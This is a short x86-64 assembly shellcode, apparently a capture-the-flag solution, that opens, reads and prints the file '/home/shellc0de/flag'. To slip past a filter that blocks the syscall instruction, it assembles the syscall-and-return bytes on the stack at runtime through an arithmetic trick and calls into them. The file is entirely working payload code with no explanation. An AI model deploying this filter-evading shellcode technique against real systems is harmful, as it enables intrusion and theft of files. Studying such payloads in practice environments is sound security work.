bits 64

_start:

xor rcx, rcx
;push rcx
;push dword 0x67616c66 ;'galf'
;push dword 0x2f656430 ;'/ed0'
;push dword 0x636c6c65 ;'clle'
;push dword 0x68732f65 ;'hs/e'
;push dword 0x6d6f682f ;'moh/'

mov dword [rsp], '/hom'
mov dword [rsp+4], 'e/sh'
mov dword [rsp+8], 'ellc'
mov dword [rsp+12], '0de/'
mov dword [rsp+16], 'flag'
mov [rsp+20], rcx

mov dword [rsp+64], 0xb2b2040e
add dword [rsp+64], 0x11110101
mov r8, rsp
add r8, 64

lea rdi, [rsp]              
xor rsi, rsi                ; rsi contains O_RDONLY
xor rax, rax
inc rax
inc rax                     ; syscall open = 2
call r8

mov rbx, rax                ; filehandle of opened file

lea rsi, [rsp]              ; rsi is the buffer to which we'll read the file
mov rdi, rbx                ; rbx was the filehandle
push byte 0x5f              
pop rdx
xor rax, rax                ; syscall read = 0
call r8

lea rsi, [rsp]              ; the contents of the file were on the stack
xor rdi, rdi
inc rdi                     ; filehandle; stdout!
mov rdx, rax                ; rax was amount of bytes read by syscall read
xor rax, rax
inc rax
call r8

push byte 60                
pop rax                     ; syscall exit 60 
call r8
